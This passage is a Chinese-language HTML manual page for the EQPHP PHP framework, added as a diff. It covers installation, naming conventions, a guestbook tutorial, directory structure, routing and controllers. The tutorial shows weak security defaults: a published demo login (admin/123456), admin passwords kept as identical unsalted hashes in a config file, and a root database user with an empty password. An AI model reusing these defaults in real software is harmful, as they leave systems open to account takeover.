@@ -1,0 +1,4118 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <base target="_self">
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+    <meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7"/>
+    <meta name="robots" content="all"/>
+
+    <title>EQPHP开源中文WEB应用开发框架</title>
+    <meta name="keywords" content="EQPHP,艺青科技,PHP开源框架,PS-MVC全栈式框架"/>
+    <meta name="description" content="简单易用（Easy）且安全高效（Quick）的PHP开源框架"/>
+    <meta name="author" content="art_youth"/>
+
+    <link rel="stylesheet" type="text/css" href="manual.css"/>
+    <script type="text/javascript" src="jquery.js"></script>
+    <script type="text/javascript" src="manual.js"></script>
+    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon"/>
+</head>
+<body>
+<div class="stage">
+
+    <h1 class="h1_title">
+        <span class="far fs14">
+            <a href="http://www.eqphp.com/user/register" class="fcb1 cp" target="_blank">注册</a>
+        </span>
+        <span class="fs18 logo">EQPHP开源中文WEB应用开发框架</span>
+    </h1>
+
+    <div class="nav_title">
+        <dl>
+            <dt>框架简介(Introduce)</dt>
+            <dd>1、关于EQPHP</dd>
+            <dd>2、下载安装、环境配置</dd>
+            <dd>3、约束规范</dd>
+            <dd>4、案例 - 留言本</dd>
+            <dd>5、捐赠</dd>
+            <dd>6、加入我们</dd>
+        </dl>
+
+        <dl>
+            <dt>分封思想(TPS-MVC)</dt>
+            <dd>1、目录结构与说明</dd>
+            <dd>2、调用流程与执行原理</dd>
+            <dd>3、路由</dd>
+            <dd>4、控制器</dd>
+            <dd>5、视图模板</dd>
+            <dd>6、业务逻辑与数据模型</dd>
+            <dd>7、组件注册与应用</dd>
+            <dd>8、工具类、快捷函数</dd>
+        </dl>
+
+        <dl>
+            <dt>细节技巧(Skills)</dt>
+            <dd>1、数据库(mysql)</dd>
+            <dd>2、请求与响应</dd>
+            <dd>3、输入、验证过滤</dd>
+            <dd>4、上传下载、目录操作</dd>
+            <dd>5、构建DOM、表单</dd>
+            <dd>6、session、缓存</dd>
+            <dd>7、邮件、图像、加密</dd>
+            <dd>8、日志、代码调试</dd>
+        </dl>
+
+        <dl>
+            <dt>扩展应用(Extends)</dt>
+            <dd>1、NoSQL技术</dd>
+            <dd>2、模板引擎</dd>
+            <dd>3、restful、API开发</dd>
+            <dd>4、数据传输与安全</dd>
+            <dd>5、多语言化界面实现</dd>
+            <dd>6、cli模式、计划任务</dd>
+            <dd>7、TDD、单元测试</dd>
+            <dd>8、架构、部署方案</dd>
+        </dl>
+
+        <dl>
+            <dt>速查手册(Manual)</dt>
+            <dd>1、常量</dd>
+            <dd>2、工具类</dd>
+            <dd>3、组件类</dd>
+            <dd>4、错误异常码</dd>
+        </dl>
+    </div>
+
+    <div class="main">
+
+        <h1 article_id="1"><strong class="fal">EQPHP简介</strong></h1>
+
+        
+        <div class="item">
+
+            <img src="image/eqphp.png">
+            <span class="fsb fs18 fcr">　　欢迎使用 EQPHP</span><br><br>
+            EQPHP，一款简单易用（Easy）且安全高效（Quick）的PHP开源框架，SP-MVC架构思想；<br>
+            涵盖：请求响应、验证过滤、上传下载、加密解密、日志调试、性能测试、缓存静态化、国际化等技术点；<br>
+            囊括：文件目录操作、数据库使用、图形图像处理、邮件短信发送、DOM表单构建、模板引擎解析等解决方案；<br>
+            结构简洁（单一入口、自动加载、双模多分组）、类库丰富、部署灵活，可任意调整等特性，适合所有Web项目开发。<br><br><br>
+            <h5 class="fs15 fcb1 fsb">为什么选择EQPHP？</h5><br>
+            <span class="fsb fcr">简单</span><br>
+            命名简洁、语法规范（符合psr4），阅览愉快<br>
+            有手册，用法齐全；参考demo、开发得心应手<br>
+            兼容php5.3以上所有版本，版本升级、扩展更加容易<br><br>
+            <span class="fsb fcr">自由</span><br>
+            免费开源，遵循Apache2开源协议发布<br>
+            没有严格或额外的约束，一切按你的规范、习惯来<br>
+            架构思想源于众多项目总结，你的需求决定框架结构，无论怎么玩都行<br><br>
+            <span class="fsb fcr">安全</span><br>
+            从接收到运行输出，验证、过滤、SQL注入、XSS、CSRF安全预防<br>
+            无论是事务、加密签名，还是异常追溯、日志让你的系统有迹可循，永不变朽<br><br>
+
+            <span class="fsb fcr">性能出众</span><br>
+            <p class="mt5">Acer（2核 AMD-1.5GHz、4G内存）+ Ubuntu(14.04)系统</p>
+            <p class="mt5">从mysql(5.0.5)取一字段（Hello world）使用MVC模式渲染到浏览器页面，性能报告：</p>
+            <table id="index_table" class="mt10">
+                <tr><th width="120px">PHP版本</th><th>5.3.22</th><th>5.4.12</th><th>5.5.33</th><th>5.6.19</th><th>7.0.4</th></tr>
+                <tr><td>时间(s)</td><td>0.017</td><td>0.014</td><td>0.014</td><td>0.015</td><td>0.011</td></tr>
+                <tr><td>CPU(%)</td><td>1.07</td><td>1.11</td><td>1.09</td><td>1.06</td><td>0.71</td></tr>
+                <tr><td>内存(KB)</td><td>1584.625</td><td>1516.312</td><td>1579.118</td><td>1580.215</td><td>1209.496</td></tr>
+                <tr><td>内存峰值(KB)</td><td>6748.625</td><td>6518.324</td><td>6589.115</td><td>6689.079</td><td>4448.151</td></tr>
+            </table><br>
+
+            <span class="fsb fcr">优雅</span><br>
+            你有更多的时间品茶、喝咖啡、陪家人<br>
+            当然，你也会有漂亮女朋友、帅气的老公<br>
+            拥有时间、拥有金钱，甚至拥有整个世界……<br><br><br>
+
+        </div>
+
+        <div class="item"><br>
+            <strong>官方下载地址：</strong>
+            <a href="http://www.eqphp.com/file/package/eqphp_3.0.1.zip" title="点击下载EQPHP 3.0压缩包">http://www.eqphp.com/file/package/eqphp_3.0.1.zip</a><br><br>
+
+            <strong>GitHub下载地址：</strong>
+            <a href="https://github.com/eqphp/framework" title="EQPHP 3.0 github 下载" target="_blank">https://github.com/eqphp/framework</a><br><br>
+
+
+            <strong>运行环境要求：</strong>
+            Linux、Windows平台，PHP5.3及以上版本<br><br>
+            <strong>wamp、la/nmp环境下非常简单，步骤如下：</strong><br>
+            　<p>1、下载压缩包，直接解压，将解压后的www目录里的内容复制到www目录（或htdocs）下即可</p>
+            　<p>2、开启伪静态：<br>
+            　　　httpd.conf文件中去掉LoadModule rewrite_module modules/mod_rewrite.so的注释，<br>
+            　　　找到AllowOverride None 改为 AllowOverride All 后并重启Apache服务.</p><br>
+            
+            <p>3、配置访问域名config/local/system.php后，地址栏输入http://127.0.0.1/，即可看到欢迎界面。</p>
+            <img src="image/eqphp_default_page.gif"><br><br><br>
+
+
+        </div>
+
+        <div class="item">
+            说实话，你是不是很不情愿被约束，被习惯呢？或者说你的习惯已经很好了，自成风格，自有规范，其它的统统是异类……<br>
+            哈哈，不必担心，EQPHP遵循你的习惯爱好、让你的开发更加得心应手。<br><br>
+
+            <table class="manual">
+                <tr>
+                    <th width="150px">名称类别</th>
+                    <th width="240px">snake_case</th>
+                    <th>camelCase</th>
+                </tr>
+                <tr>
+                    <td>工具类</td>
+                    <td>basic</td>
+                    <td>Basic</td>
+                </tr>
+                <tr>
+                    <td>业务类</td>
+                    <td>s_trade</td>
+                    <td>TradeServer</td>
+                </tr>
+                <tr>
+                    <td>模型类</td>
+                    <td>m_user</td>
+                    <td>UserModel</td>
+                </tr>
+                <tr>
+                    <td>控制器</td>
+                    <td>a_register</td>
+                    <td>RegisterAction</td>
+                </tr>
+                <tr>
+                    <td>函数-组件类</td>
+                    <td>p_function</td>
+                    <td>FunctionPlugin</td>
+                </tr>
+                <tr>
+                    <td>调节器-组件类</td>
+                    <td>p_modifier</td>
+                    <td>ModifierPlugin</td>
+                </tr>
+                <tr>
+                    <td>方法名</td>
+                    <td>get_user_profile</td>
+                    <td>getUserProfile</td>
+                </tr>
+                <tr>
+                    <td>变量名</td>
+                    <td>$user_id、 $timezone</td>
+                    <td>$userId、$timezone</td>
+                </tr>
+                <tr>
+                    <td>常量名</td>
+                    <td>PATH_ROOT、 U_R_L</td>
+                    <td>PATH_ROOT、 U_R_L</td>
+                </tr>
+
+                <tr>
+                    <td>比较</td>
+                    <td colspan="2">
+                        1、php类名、方法名均不区分大小写，而变量名区分大小写；<br>
+                        2、网址(URL，路由、控制器)不区分大小写；<br>
+                        3、mysql不经过特殊配置，表、字段不支持大写；<br>
+                        4、windows系统下大小写不敏感，而linux系统下大小写敏感；<br>
+                        5、snake_case符合php原始风格，而camelCase更符合psr规范；<br>
+                        6、snake_case看起来清爽醒目，而camelCase给人感觉紧致有范；<br>
+                        7、两种均可作为标准规范，并没有谁优谁劣、谁对谁错的说法。<br>
+                    </td>
+                </tr>
+
+                <tr>
+                    <td>如何选择</td>
+                    <td colspan="2">
+                        如果你是“纯真的” PHP开发者、疑惑你习惯在Windows下开发请选择snake_case风格；<br>
+                        如果你是其他语言转学PHP者、或喜欢在Linux下开发、或想遵循psr规范请选择camelCase风格；<br>
+                    </td>
+                </tr>
+
+                <tr>
+                    <td>如何设置</td>
+                    <td colspan="2">
+                        配置入口文件index.php、data/crontab/crontab.php、test/unit/baseTest.php<br>
+                        的类自动加载函数spl_autoload_register参数值：<br>
+                        camelCase风格：camelLoad、snake_case风格(默认)：snake_load、类路径（class-map）：map_load<br>
+                    </td>
+                </tr>
+
+            </table><br><br>
+
+
+            <strong class="fs14">推荐以下约束：</strong><br><br>
+            <p>1、一个文件只放一个类，所有代码均以类的结构呈现；</p><br>
+            <p>2、一个类只做该做的事、一个方法只实现最少的功能；<br></p><br>
+            <p>3、凡事不过三，开发也一样，嵌套（继承{接口、抽象、实现}、循环、条件判断、缩进……）最多三层；</p><br>
+            <p>4、多提取子方法处理多层嵌套，牺牲微末性能来提高代码可读性、可维护性；</p><br>
+            <p>5、多考虑设计原则，少套用设计模式，避免过度开发；</p><br>
+            <p>6、常观察优化代码，清楚变朽成分，使系统永葆健康稳定、高速运转.</p><br>
+        </div>
+
+
+        <div class="item">
+            EQPHP到底能做啥？好使不？接下来我们来开发一个留言本。<br>
+            <strong><em class="fsi fcr">step 1</em>、先看需求规格：</strong><br>
+            <img src="image/message_book_used.gif" alt="message book page"><br>
+
+            <strong><em class="fsi fcr">step 2</em>、设计效果图如下：</strong><br>
+            <a href="http://www.eqphp.com/guest_book/" target="_blank">留言发表页面</a>、
+            <a href="http://www.eqphp.com/guest_book/login2" target="_blank">管理员登陆页面</a>(admin/123456)、
+            <a href="http://www.eqphp.com/guest_book/manage" target="_blank">留言管理页面</a><br><br>
+
+
+            <strong><em class="fsi fcr">step 3</em>、切图、出静态页面：</strong><br>
+            模板：index.html、manage.html、login.html、forbid.html<br>
+            样式表：basic.css、massage.css、manage.css、login.css<br>
+            脚本：common.js、message.js、manage.js、login.js<br><br>
+
+            <strong><em class="fsi fcr">step 4-1</em>、设计数据库 - message留言表：</strong><br>
+            <code>
+                CREATE TABLE message (<br>
+                <b class="i24"></b>id int(11) NOT NULL AUTO_INCREMENT,<br>
+                <b class="i24"></b>is_view tinyint(4) NOT NULL DEFAULT '0' COMMENT '是否查看',<br>
+                <b class="i24"></b>time timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '留言时间',<br>
+                <b class="i24"></b>user_name varchar(24) NOT NULL DEFAULT '' COMMENT '用户称呼',<br>
+                <b class="i24"></b>phone char(11) NOT NULL DEFAULT '' COMMENT '手机号码',<br>
+                <b class="i24"></b>email varchar(32) NOT NULL DEFAULT '' COMMENT '电子邮箱',<br>
+                <b class="i24"></b>message varchar(512) NOT NULL DEFAULT '' COMMENT '留言内容',<br>
+                <b class="i24"></b>PRIMARY KEY (id),<br>
+                <b class="i24"></b>KEY is_view (is_view)<br>
+                ) ENGINE=InnoDB  DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT '留言表';
+            </code><br>
+
+            <strong><em class="fsi fcr">step 4-2</em>、管理员 - 配置文件：</strong><br>
+            <code>
+                return [<br>
+                <b class="i24"></b>'admin'=>array(<br>
+                <b class="i48"></b>'administrator' => 'ddad04b61d2bd99e5733f939698a1917',<br>
+                <b class="i48"></b>'admin' => 'ddad04b61d2bd99e5733f939698a1917',<br>
+                <b class="i48"></b>'user' => 'ddad04b61d2bd99e5733f939698a1917',<br>
+                <b class="i48"></b>'eqphp' => 'ddad04b61d2bd99e5733f939698a1917',<br>
+                <b class="i24"></b>],<br><br>
+
+                <b class="i24"></b>'access'=>[<br>
+                <b class="i48"></b>'list'=>['无权限','浏览','删除留言','邮件回复',],<br>
+                <b class="i48"></b>'administrator' => [1,2,3],<br>
+                <b class="i48"></b>'admin' => array(1,2),<br>
+                <b class="i48"></b>'user' => array(1),<br>
+                <b class="i48"></b>'eqphp' => array(0),<br>
+                <b class="i24"></b>],<br>
+                ];
+            </code><br>
+
+            4-3、配置数据库链接信息，打开config/local/db.php文件，配置如下：<br>
+            <code>
+                return [<br>
+                <b class="i24"></b>'server'=>[<br>
+                <b class="i48"></b>'host'=>'localhost',<br>
+                <b class="i48"></b>'port'=>3306,<br>
+                <b class="i48"></b>'user'=>'root',<br>
+                <b class="i48"></b>'password'=>'',<br>
+                <b class="i48"></b>'database'=>'eqphp',<br>
+                <b class="i48"></b>'charset'=>'utf8',<br>
+                <b class="i24"></b>],<br>
+                ];
+            </code><br><br>
+
+            <strong><em class="fsi fcr">step 5</em>、写程序，处理数据业务逻辑：</strong><br>
+
+            5-1、开发留言发表功能（发表留言）(message/action/a_index.php)<br>
+            <code>
+                class a_index{<br><br>
+
+                <b class="i24"></b><i>//静态类</i><br>
+                <b class="i24"></b>private $static_class;<br><br>
+
+                <b class="i24"></b><i>//发表留言页面</i><br>
+                <b class="i24"></b>static function index(){<br>
+                <b class="i48"></b><i>//设置、输出页面标题和关键词</i><br>
+                <b class="i48"></b>$head['title'] = '欢迎使用EQPHP案例留言本';<br>
+                <b class="i48"></b>$head['keywords'] = 'EQPHP留言本、简约留言薄、邮件发送、数据安全与过滤';<br>
+                <b class="i48"></b>$head['keywords'] .= 'json数据、权限分配、正则验证、配置文件读取、css sprite';<br><br>
+
+                <b class="i48"></b><i>//渲染视图模板</i><br>
+                <b class="i48"></b>smarty()->assign('head', $head)->display('guest_book/index');<br>
+                <b class="i24"></b>}<br><br>
+
+                <b class="i24"></b><i>//接收处理用户留言数据</i><br>
+                <b class="i24"></b>static function process(){<br>
+                <b class="i48"></b><i>//检查验证码</i><br>
+                <b class="i48"></b>$captcha = post('captcha', 'post');<br>
+                <b class="i48"></b>$check_code = session('captcha', true);<br>
+                <b class="i48"></b>validate::check_tip($captcha, ['equal', $check_code], [1, 'captcha error']);<br><br>
+
+                <b class="i48"></b><i>//接收、过滤数据</i><br>
+                <b class="i48"></b>$tip = [2, 'message length error'];<br>
+                <b class="i48"></b>$rule = ['message' => 'title', 'name' => 'title',<br>
+                <b class="i96"></b>'phone' => 'phone', 'email' => 'email'];<br>
+                <b class="i48"></b>validate::check_tip(input::post('message', 'title'), ['length', '1,140'], $tip);<br>
+                <b class="i48"></b>$message = input::filter($rule, 'post', ['name' => 'user_name']);<br><br>
+
+                <b class="i48"></b><i>//将数据写入留言表</i><br>
+                <b class="i48"></b>if (db::post('message', $message)) {<br>
+                <b class="i72"></b>http::json(['error' => 0, 'info' => 'message succeed']);<br>
+                <b class="i48"></b>}<br>
+                <b class="i24"></b>}<br><br>
+
+                }
+            </code><br>
+
+            5-2、开发留言查看功能（分页查看、筛选未读留言）(message/action/a_manage.php)<br>
+            <code>
+
+                class a_manage extends a_access{<br><br>
+
+                <b class="i24"></b>function index(){<br>
+
+                <b class="i48"></b><i>//验证权限，跳转提示页面</i><br>
+                <b class="i48"></b>if (!in_array(parent::VISIT_ACCESS, $this->admin_access)) {<br>
+                <b class="i72"></b>http::redirect('message/login/forbid');<br>
+                <b class="i48"></b>}<br><br>
+
+                <b class="i48"></b><i>//接收请求参数</i><br>
+                <b class="i48"></b>$category = url(2); <i>//类型(1,已读/0,未读/全部)</i><br>
+                <b class="i48"></b>$page = url(3, 1); <i>//页码</i><br><br>
+
+                <b class="i48"></b><i>//获取删除和回复权限</i><br>
+                <b class="i48"></b>$delete_access = in_array(parent::DELETE_ACCESS, $this->admin_access);<br>
+                <b class="i48"></b>$reply_access = in_array(parent::REPLY_ACCESS, $this->admin_access);<br><br>
+
+                <b class="i48"></b><i>//调用查询模型</i><br>
+                <b class="i48"></b>list($record_count, $page_count, $message) = self::message_model($category, $page, 10);<br><br>
+                <b class="i48"></b><i>//处理分页导航</i><br>
+                <b class="i48"></b>$page_url = U_R_L . 'manage/' . $category . '/';<br>
+                <b class="i48"></b>$page_mark = page::mark($page_url, $page_count, $page, 3);<br><br>
+
+                <b class="i48"></b><i>//视图赋值</i><br>
+                <b class="i48"></b>$head['frame'] = '_self';<br>
+                <b class="i48"></b>$head['title'] = '留言管理_EQPHP案例留言本';<br>
+                <b class="i48"></b>$data = compact('head', 'delete_access', 'reply_access', 'record_count',<br>
+                <b class="i96"></b>'message', 'page_mark');<br><br>
+
+                <b class="i48"></b><i>//渲染视图模板</i><br>
+                <b class="i48"></b>smarty()->assign($data)->display('message/manage');<br>
+                <b class="i24"></b>}<br><br>
+
+                <b class="i24"></b><i>//数据查询模型(可放model里)</i><br>
+                <b class="i24"></b>private static function message_model($category, $page = 1, $page_size = 15){<br>
+                <b class="i48"></b><i>//处理查询条件</i><br>
+                <b class="i48"></b>$condition = null;<br>
+                <b class="i48"></b>$category_list = ['all' => null, 'unread' => 0, 'read' => 1];<br>
+                <b class="i48"></b>if (isset($category_list[$category]) && $category_list[$category] !== null) {<br>
+                <b class="i72"></b>$condition .= 'is_view=' . $category_list[$category];<br>
+                <b class="i48"></b>}<br><br>
+
+                <b class="i48"></b><i>//构造SQL语句、查询</i><br>
+                <b class="i48"></b>$field = 'id,is_view,time,user_name,phone,email,message';<br>
+                <b class="i48"></b>$record_count = db::field(parent::TABLE, 'count(1)', $condition);<br>
+                <b class="i48"></b>return query(parent::TABLE)->select($field)->where($condition)<br>
+                <b class="i72"></b>->order('id desc')->out('page', $record_count, $page, $page_size);<br>
+                <b class="i24"></b>}<br><br>
+
+                }
+            </code><br>
+
+            5-3、开发留言管理功能（标注已读、删除）。<br>
+            在action目录下创建一个名为a_process.php的php脚本文件.<br><br>
+            5-4、开发权限功能（登录、查看、标注、删除）。<br>
+            在action目录下创建名为a_access.php、a_login.php的脚本文件.<br><br>
+            　<a class="fs18" href="#" target="_blank">下载案例留言本源码</a><br><br>
+        </div>
+
+        <div class="item">
+            谢谢你的支持，我们暂不接受捐赠。
+        </div>
+
+        <div class="item">
+            <table class="manual">
+                <tr><th width="150px" height="45px"><a href="http://www.eqphp.com/blog" target="_blank">博客</a>、
+                    <a href="http://weibo.com/eqphp" target="_blank">微博</a></th>
+                    <td>http://www.eqphp.com/blog　　　http://weibo.com/eqphp</td></tr>
+                <tr><th height="45px">技术交流QQ群</th><td>67693067　　　278464325　　　264386791</td></tr>
+                <tr><th height="45px"><a href="https://gitter.im/eqphp/framework" target="_blank">getter聊天</a></th>
+                    <td>https://gitter.im/eqphp/framework</td></tr>
+                <tr><th height="60px">&nbsp;</th><td><a href="http://www.eqphp.com/user/register" target="_blank"><button id="join_us">加入我们</button></a></td></tr>
+                <tr><th>微信公众号：<br>eqphpBlog</th><td class="p12"><img src="image/weixin_eqphp_blog.gif"></td></tr>
+                <!--<tr><th>捐助我们</th><td class="p12"><img src="image/weixin_small.gif"><br><br><img src="image/alipay_small.gif"></td></tr>-->
+            </table>
+        </div>
+
+
+        <div class="item">
+            <code>
+                www<br>
+                ├─library<i>(工具类、核心类)</i><br>
+                ├─server<i>(业务逻辑)</i><br>
+                ├─module<i>(模块)</i><br>
+                │  ├─common<i>(默认模块、公共模块)</i><br>
+                │  │  ├─action<i>(控制器)</i><br>
+                │  │  ├─model<i>(数据模型)</i><br>
+                │  │  └─plugin<i>(组件)</i><br>
+                │  ├─user<i>(用户)</i><br>
+                │  │  ├─config<i>(配置)</i><br>
+                │  │  ├─action<i>(控制器)</i><br>
+                │  │  ├─model<i>(数据模型)</i><br>
+                │  │  └─plugin<i>(组件)</i><br>
+                │  ├─ ... <i>(其他模块)</i><br>
+                │  └─admin<i>(后台管理)</i><br>
+                ├─config<i>(系统配置)</i><br>
+                │  ├─local<i>(本地开发环境)</i><br>
+                │  ├─test<i>(测试环境)</i><br>
+                │  ├─similar<i>(仿真环境)</i><br>
+                │  └─product<i>(生产环境)</i><br>
+                └─view<i>(视图)</i><br>
+                │  ├─abort<i>(404、500异常页面)</i><br>
+                │  ├─plugin<i>(组件视图)</i><br>
+                │  ├─template<i>(短信、邮件模板)</i><br>
+                │  └─user<br>
+                │     ├─block<br>
+                │     ├─layout<br>
+                │     └─password<br>
+                ├─data<i>(项目私有数据)</i><br>
+                │  ├─vendor<i>(第三方类库)</i><br>
+                │  │  ├─alipay<i>(支付宝)</i><br>
+                │  │  └─smarty<i>(smarty模板引擎)</i><br>
+                │  ├─backup<i>(数据备份)</i><br>
+                │  ├─crontab<i>(计划任务)</i><br>
+                │  ├─lang<i>(语言包)</i><br>
+                │  │  ├─cn<br>
+                │  │  └─en<br>
+                │  ├─source<i>(用户私有数据)</i><br>
+                │  │  └─identification<br>
+                │  │      ├─identity<br>
+                │  │      └─license<br>
+                │  ├─store<i>(资源仓)</i><br>
+                │  ├─font<i>(字体)</i><br>
+                │  ├─dict<i>(字典)</i><br>
+                │  └─uml<i>(类图)</i><br>
+                ├─file<i>(静态公共资源)</i><br>
+                │  ├─document<br>
+                │  ├─html<br>
+                │  ├─json<br>
+                │  ├─media<br>
+                │  ├─picture<i>(上传图片)</i><br>
+                │  │  ├─avatar<br>
+                │  │  └─photo<br>
+                │  ├─static<i>(网页静态资源)</i><br>
+                │  │  ├─image<br>
+                │  │  ├─script<br>
+                │  │  │  └─plugin<br>
+                │  │  ├─style<br>
+                │  │  │  └─plugin<br>
+                │  │  └─user<br>
+                │  │     ├─image<br>
+                │  │     ├─script<br>
+                │  │     └─style<br>
+                │  ├─temp<br>
+                │  └─package<br>
+                ├─test<i>(测试)</i><br>
+                │  └─unit<i>(单元测试)</i><br>
+                ├─cache<i>(缓存)</i><br>
+                │  ├─compile<i>(编译)</i><br>
+                │  ├─data<i>(缓存数据)</i><br>
+                │  │  ├─ini<br>
+                │  │  ├─json<br>
+                │  │  ├─php<br>
+                │  │  ├─txt<br>
+                │  │  └─xml<br>
+                │  ├─session<i>(会话数据)</i><br>
+                │  └─smarty<br>
+                │      └─compile<br>
+                └─log<i>(日志)</i><br>
+                　  ├─mongo<i>(mongoDB执行日志)</i><br>
+                　  ├─run<i>(系统运行日志)</i><br>
+                　  ├─mysql<i>(MYSQL执行日志)</i><br>
+                　  ├─test<i>(测试日志)</i><br>
+                　  ├─topic<i>(错误、异常日志)</i><br>
+                　  ├─trace<i>(调试日志)</i><br>
+                　  └─visit<i>(访问日志)</i><br>
+            </code><br>
+            <strong class="fcy1">Tip：</strong><br>
+            <strong>1、分组(模块)可有有多个，每个都有控制器、数据模型、组件、配置4个目录；</strong><br>
+            <strong>2、除一级目录外，其它的可自定义，详情请参考config/local/directory.php文件；</strong><br>
+            <strong>3、视图(view)、文件(file)、数据(data)、日志(log)、缓存(cache)结构可以任意整合，此结构只做参考；</strong>
+        </div>
+
+        <div class="item"><br><br>
+            <img src="image/eqphp_frame_relation.gif"><br><br>
+            <span class="fsb fcr">备注：</span><br>
+            <strong>1、对于简单项目，可以不用分组；</strong><br>
+            <strong>2、多层级、多划分的目的是为了业务逻辑处理、数据加工更加简洁明了；</strong><br>
+            <strong>3、本样图只是常规应用的部署架构，对于具体项目可以自由修改。</strong>
+        </div>
+
+        <div class="item">
+            <strong>URL模式：</strong><br>
+            <span>传统url：{协议}://{二级域名}.{域名}/[分组/]{php脚本}?{get参数}。如：http://www.eqphp.com/admin/news.php?action=delete&id=8</span><br>
+            <span>分段路由(pathinfo)：{协议}://{二级域名或分组名}.{域名}/[分组/]{控制器}/{方法}/{参数}。如：http://www.eqphp.com/admin/news/delete/8</span><br>
+            <span>混合路由：{协议}://{二级域名}.{域名}/[分组/]{控制器}/{方法}/?{url片段}。如：http://www.eqphp.com/admin/news/delete?id=8&form=admin#lay_3</span><br><br>
+
+            <strong>获取pathinfo(分段)路由的参数：url('位置','接收类型')</strong><br>
+            <span>1、获取url：http://www.eqphp.com/admin/news/delete/8 的各段参数</span><br>
+            <code>
+                $module=url(0);<i>//分组名:admin</i><br>
+                $news_id=url(3,1);<i>//文章ID:8，第二个参数1表示以int类型接收</i><br>
+                list($module,$category,$action,$news_id)=$param;<i>//$param为控制器的参数</i><br>
+            </code>
+
+            <span>2、获取url：http://www.eqphp.com/user/activate/15001359***/444bcb3a3fcf8389296c49467f27e1d6 的各段参数，</span><br>
+            <code>
+                $phone=url(2,'phone');<i>//手机号</i><br>
+                $code=url(3,'md5');<i>//md5值，第二个参数也可是正则表达式</i><br>
+            </code><br>
+
+            <strong>构造URL：help::url()</strong><br>
+            <code><i>//http://www.eqphp.com/news/list/10#top</i><br>
+                help::url('news','list',$page,'/#top');<br><br>
+
+                <i>//http://www.eqphp.com/news/list/?category=history&sort=hit_desc&page=10#bottom</i><br>
+                help::url('news.list',['category'=>'history','sort'=>'hit_desc','page'=>$page,'#'=>'bottom']);</code>
+            <strong class="fcy1">Tip：</strong>第二种方式只能有两个参数，且第二参数必须是K-V数组<br><br>
+
+            <strong>构建随心所欲url：</strong><br>
+            <span>通常遇到list不能作为控制器的方法名，或省去url中不必要成份（如index等），这时就可通过config/local/route.php进行配置。</span>
+            <code>
+                'topic'=>'a_index::topic',<i>//http://www.eqphp.com/topic</i><br><br>
+
+                'blog'=>[<br>
+                　　'write'=>'a_index::write',<i>//http://www.eqphp.com/blog/write</i><br>
+                ],<br><br>
+
+                <i>//实现restful风格</i><br>
+                'news'=>[<br>
+                　　'list'=>'a_index::list_news',<i>//http://www.eqphp.com/news/list</i><br>
+                　　'/'=>'a_index::index',<i>//http://www.eqphp.com/news/8</i><br>
+                　　'post'=>'a_cmd::post',<i>//http://www.eqphp.com/news/post</i><br>
+                　　'patch'=>'a_cmd::patch',<i>//http://www.eqphp.com/news/patch/8</i><br>
+                　　'put'=>'a_cmd::put',<i>//http://www.eqphp.com/news/put/8</i><br>
+                　　'delete'=>'a_cmd::delete',<i>//http://www.eqphp.com/news/delete/10</i><br>
+                ],
+            </code><br><br>
+
+            <strong>模块名使用二级域名：</strong><br>
+            <span>
+                step1、打开system.php，将需要的二级域名添加到[module]下的subdomain里；<br>
+                step2、注意修改url($lie,$type)中的起始位置。<br>
+            </span>
+        </div>
+
+
+        <div class="item">
+            <strong>作用：</strong><br>
+            <span>1、接收用户请求、加工处理请求条件(如：post、get(或url片段)、协议等)；</span><br>
+            <span>2、根据请求（包括异步）参数，调用模型（model）所加工的数据或业务逻辑（server）处理结果，并赋值视图，加载渲染视图返回处理结果给用户；</span><br>
+            <span>3、处理控制器内部业务逻辑，完善并使得控制器高度自治。</span><br><br>
+
+            <strong>说明：</strong><br>
+            <span>1、本框架追求简洁，提倡采用流行的分段路由（<a href="" title="点击查看如何开启伪静态支持？">需要支持伪静态</a>），但不废除传统路由和混合路由；</span><br>
+            <span>2、每个控制器须有默认方法（即index），请求的url的方法不存在时自动跳转到index方法。当然也可自定义魔术方法__call()。</span><br>
+            <span>3、每个模块控制器目录下的a_模块名.php作为（该分组下的）默认控制器，当url中没有正确控制器时执行该默认控制器
+                <a href="">案例：controller</a>。</span><br>
+            <span>4、每个对外控制器方法可有一个(静态)或多个（非静态）形参，形参的值为：explode('/',URL_REQUEST)的结果。</span><br><br>
+
+            <strong>例外：</strong><br>
+            <span>1、对于静态控制器（不需要实例化），需要声明私有属性$static_class，<br>且对外访问的每个方法必须加static修饰，可用魔术方法__callStatic
+                <a href="">案例：controller static</a>；</span><br>
+            <span>2、当控制器含有魔术方法__destruct（析构函数）或__after(后置方法)时，慎用(exit、die)，以免程序运行出错
+                <a href="">案例：controller destruct</a>；</span><br>
+            <span>3、当控制器继承其它类时，父类和自身具有构造函数，需在自身构造器内首先调用父类构造器，以免父类构造器被重写
+                <a href="">案例：controller construct</a>。</span><br><br>
+
+
+            <strong>案例（demo）</strong><br>
+            <span>case 1: controller<br>
+            <code>
+                <b class="i24"></b><i>//默认控制器</i><br>
+                <b class="i24"></b>class a_index{<br><br>
+                <b class="i48"></b><i>//默认方法，访问：http://localhost/，即可看到Hello EQPHP !</i><br>
+                <b class="i48"></b>function index(){<br>
+                <b class="i72"></b>echo 'Hello EQPHP !';<br>
+                <b class="i48"></b>}<br><br>
+                <b class="i24"></b>}
+            </code>
+            </span><br><br>
+
+            <span>case 2: controller static<br>
+            <code>
+                <b class="i24"></b><i>//静态控制器</i><br>
+                <b class="i24"></b>class a_test{<br><br>
+                <b class="i48"></b>private $static_class; <i>//声明为静态控制器</i><br><br>
+                <b class="i48"></b><i>//输出：$500</i><br>
+                <b class="i48"></b>static function index(){<br>
+                <b class="i72"></b>echo self::get_money();<br>
+                <b class="i48"></b>}<br><br>
+                <b class="i48"></b>static private function get_money(){<br>
+                <b class="i72"></b>return '$500';<br>
+                <b class="i48"></b>}<br><br>
+                <b class="i24"></b>}
+            </code>
+            </span><br><br>
+
+
+            <span>case 3: controller destruct<br>
+            <code>
+                <b class="i24"></b>class a_demo{<br><br>
+                <b class="i48"></b>private $name;<br><br>
+                <b class="i48"></b>function __construct(){<br>
+                <b class="i72"></b>$this->name='demo';<br>
+                <b class="i48"></b>}<br><br>
+                <b class="i48"></b><i>//输出：demo换行demo换行,不能输出de…</i><br>
+                <b class="i48"></b>function index(){<br>
+                <b class="i72"></b><i>//http::string方法中有exit，导致__destruct不能正常执行</i><br>
+                <b class="i72"></b>http::string($this->name.'&lt;br&gt;'); <i>输出demo</i><br>
